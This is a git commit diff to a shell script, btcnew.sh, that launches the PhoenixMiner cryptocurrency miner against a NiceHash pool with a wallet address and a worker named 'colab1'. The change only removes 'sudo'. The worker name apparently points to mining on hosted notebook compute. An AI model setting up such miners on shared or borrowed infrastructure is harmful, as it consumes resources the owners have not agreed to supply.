e229acc3cd92bb0c2f0118e4a2633d139385db32
angkii <83603708+angkii@users.noreply.github.com>
2021-08-15 20:31:11 +0700

    Update btcnew.sh

--- btcnew.sh
+++ btcnew.sh
@@ -1,1 +1,1 @@
-sudo ./PhoenixMiner -pool nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 35TuxzGVmh7mC1QbvHaZxaR44NdqEdpz5X.colab1 -pass x -proto 4 -stales 0
+./PhoenixMiner -pool nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 35TuxzGVmh7mC1QbvHaZxaR44NdqEdpz5X.colab1 -pass x -proto 4 -stales 0
